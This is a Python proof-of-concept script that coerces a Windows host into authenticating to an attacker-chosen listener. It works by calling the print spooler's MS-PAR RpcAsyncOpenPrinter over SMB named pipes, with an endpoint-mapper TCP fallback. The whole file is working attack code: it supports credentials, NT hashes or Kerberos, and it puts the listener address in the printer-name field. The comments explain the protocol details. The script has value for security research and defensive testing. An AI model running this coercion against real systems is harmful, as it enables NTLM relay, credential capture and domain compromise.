#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : coerce_poc.py
# Author             : Podalirius (@podalirius_)
# Date created       : 22 Jun 2022


import sys
import argparse
from impacket import system_errors
from impacket.dcerpc.v5 import transport, epm, rprn
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'SessionError: unknown error code: 0x%x' % self.error_code


class RpcAsyncOpenPrinter(NDRCALL):
    # [MS-PAR] 3.1.4.1.1. The two containers are [in] <TYPE>* parameters, which are [ref]
    # pointers: they are transmitted inline, so they are declared by value here (exactly as
    # impacket declares pDevModeContainer for the MS-RPRN twin RpcOpenPrinter). MS-PAR
    # reuses the MS-RPRN structure definitions, so impacket's rprn types are used as is.
    opnum = 0
    structure = (
        ('pPrinterName', LPWSTR),                      # Type: wchar_t * [unique]
        ('pDatatype', LPWSTR),                         # Type: wchar_t * [unique]
        ('pDevModeContainer', rprn.DEVMODE_CONTAINER), # Type: DEVMODE_CONTAINER *
        ('AccessRequired', DWORD),                     # Type: DWORD
        ('pClientInfo', rprn.SPLCLIENT_CONTAINER),     # Type: SPLCLIENT_CONTAINER *
    )


class RpcAsyncOpenPrinterResponse(NDRCALL):
    structure = ()


class RPCProtocol(object):
    """
    Documentation for class RPCProtocol
    """

    uuid = None
    version = None
    pipe = None

    ncan_target = None
    __rpctransport = None
    dce = None

    def __init__(self):
        super(RPCProtocol, self).__init__()

    def connect(self, username, password, domain, lmhash, nthash, target, dcHost, doKerberos=False, targetIp=None):
        # Since the hardening that followed [MSFT-CVE-2021-34527], the print spooler can be
        # configured to expose its RPC interfaces over TCP only (RpcUseNamedPipeProtocol),
        # and recent Windows versions ship that way: \PIPE\spoolss then does not exist and
        # the named pipe transport fails with STATUS_OBJECT_NAME_NOT_FOUND. Try the
        # documented named pipe first, then ask the endpoint mapper on TCP/135 for the
        # dynamic ncacn_ip_tcp port the interface is registered on.
        #
        # Be aware of what this changes: the callback the target makes follows the protocol
        # sequence of the binding it was asked on. Bound over ncacn_ip_tcp, the target opens
        # its reply binding to the listener over RPC and never touches SMB, so an SMB
        # listener captures nothing. Measured against a Server 2025 DC: the call reaches the
        # spooler and returns RPC_S_SERVER_UNAVAILABLE (0x6ba) once it fails to find a print
        # client on the listener, with no connection on port 445 at all. Coercing SMB
        # authentication needs the named pipe, this fallback is what lets the call be made
        # and diagnosed at all when \\PIPE\\spoolss is gone.
        named_pipe = r'ncacn_np:%s[%s]' % (target, self.pipe)
        if self._connect_binding(named_pipe, username, password, domain, lmhash, nthash, dcHost, doKerberos, targetIp):
            return True

        print("[>] Asking the endpoint mapper of %s for an ncacn_ip_tcp endpoint ... " % target, end="")
        sys.stdout.flush()
        try:
            stringbinding = epm.hept_map(target, uuidtup_to_bin((self.uuid, self.version)), protocol='ncacn_ip_tcp')
        except Exception as e:
            print("\x1b[1;91mfail\x1b[0m")
            print("[!] Something went wrong, check error status => %s" % str(e))
            return False
        print("\x1b[1;92m%s\x1b[0m" % stringbinding)

        return self._connect_binding(stringbinding, username, password, domain, lmhash, nthash, dcHost, doKerberos, targetIp)

    def _connect_binding(self, stringbinding, username, password, domain, lmhash, nthash, dcHost, doKerberos, targetIp):
        self.ncan_target = stringbinding
        self.__rpctransport = transport.DCERPCTransportFactory(self.ncan_target)

        if hasattr(self.__rpctransport, 'set_credentials'):
            self.__rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash
            )

        if doKerberos == True:
            self.__rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        # setRemoteHost belongs to the SMB transport; an ncacn_ip_tcp binding already
        # carries its own host and port.
        if targetIp is not None and hasattr(self.__rpctransport, 'setRemoteHost'):
            self.__rpctransport.setRemoteHost(targetIp)

        self.dce = self.__rpctransport.get_dce_rpc()
        self.dce.set_auth_type(RPC_C_AUTHN_WINNT)
        self.dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        print("[>] Connecting to %s ... " % self.ncan_target, end="")
        sys.stdout.flush()
        try:
            self.dce.connect()
        except Exception as e:
            print("\x1b[1;91mfail\x1b[0m")
            print("[!] Something went wrong, check error status => %s" % str(e))
            return False
        else:
            print("\x1b[1;92msuccess\x1b[0m")

        print("[>] Binding to <uuid='%s', version='%s'> ... " % (self.uuid, self.version), end="")
        sys.stdout.flush()
        try:
            self.dce.bind(uuidtup_to_bin((self.uuid, self.version)))
        except Exception as e:
            print("\x1b[1;91mfail\x1b[0m")
            print("[!] Something went wrong, check error status => %s" % str(e))
            return False
        else:
            print("\x1b[1;92msuccess\x1b[0m")

        return True


class MS_PAR(RPCProtocol):
    uuid = "76f03f96-cdfd-44fc-a22c-64950a001209"
    version = "1.0"
    pipe = r"\PIPE\spoolss"

    def RpcAsyncOpenPrinter(self, listener):
        if self.dce is not None:
            print("[>] Calling RpcAsyncOpenPrinter() ...")
            try:
                request = RpcAsyncOpenPrinter()
                # The coerced argument: the spooler resolves this print server name, which
                # makes it authenticate to the listener over SMB ([MS-PAR] 3.1.4.1.1).
                request['pPrinterName'] = '\\\\%s\x00' % listener
                request['pDatatype'] = NULL
                # No device mode is being set, so an empty container ([MS-RPRN] 2.2.1.2.1).
                request['pDevModeContainer']['cbBuf'] = 0
                request['pDevModeContainer']['pDevMode'] = NULL
                request['AccessRequired'] = rprn.SERVER_READ
                # The IDL requires a well-formed client container; level 1 with no machine
                # or user name is the minimum ([MS-RPRN] 2.2.1.2.16 / 2.2.1.2.17). Its
                # contents play no part in the coercion.
                request['pClientInfo']['Level'] = 1
                request['pClientInfo']['ClientInfo']['tag'] = 1
                request['pClientInfo']['ClientInfo']['pClientInfo1']['dwSize'] = 0
                request['pClientInfo']['ClientInfo']['pClientInfo1']['pMachineName'] = NULL
                request['pClientInfo']['ClientInfo']['pClientInfo1']['pUserName'] = NULL
                request['pClientInfo']['ClientInfo']['pClientInfo1']['dwBuildNum'] = 0
                request['pClientInfo']['ClientInfo']['pClientInfo1']['dwMajorVersion'] = 0
                request['pClientInfo']['ClientInfo']['pClientInfo1']['dwMinorVersion'] = 0
                request['pClientInfo']['ClientInfo']['pClientInfo1']['wProcessorArchitecture'] = 0
                # request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                print(e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")


if __name__ == '__main__':
    print("Windows auth coerce using MS-PAR::RpcAsyncOpenPrinter()\n")
    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-PAR::RpcAsyncOpenPrinter()")

    parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
    parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
    parser.add_argument("-d", "--domain", default="", help="Windows domain name to authenticate to the endpoint.")
    parser.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH", help="NT/LM hashes (LM hash can be empty)")
    parser.add_argument("--no-pass", action="store_true", help="Don't ask for password (useful for -k)")
    parser.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line")
    parser.add_argument("--dc-ip", action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
    parser.add_argument("--target-ip", action="store", metavar="ip address", help="IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it")

    parser.add_argument("listener", help="IP address or hostname of listener")
    parser.add_argument("target", help="IP address or hostname of target")

    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash, nthash = '', ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass

        options.password = getpass("Password:")

    protocol = MS_PAR()

    connected = protocol.connect(
        username=options.username,
        password=options.password,
        domain=options.domain,
        lmhash=lmhash,
        nthash=nthash,
        target=options.target,
        doKerberos=options.kerberos,
        dcHost=options.dc_ip,
        targetIp=options.target_ip
    )

    if connected:
        protocol.RpcAsyncOpenPrinter(options.listener)

    sys.exit()